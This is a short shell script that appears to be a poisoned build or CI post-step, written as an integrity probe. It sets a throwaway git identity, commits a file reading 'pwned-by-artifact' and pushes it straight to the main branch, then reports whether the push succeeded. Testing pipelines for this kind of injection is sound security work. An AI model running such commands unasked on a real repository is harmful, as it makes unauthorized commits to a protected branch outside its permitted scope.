echo POISONED_POST_RAN
git config user.name probe && git config user.email probe@example.invalid
echo "pwned-by-artifact" > integrity-probe.txt && git add integrity-probe.txt && git commit -q -m "integrity probe from artifact"
git push origin HEAD:main 2>&1; echo "PUSH_EXIT=$?"
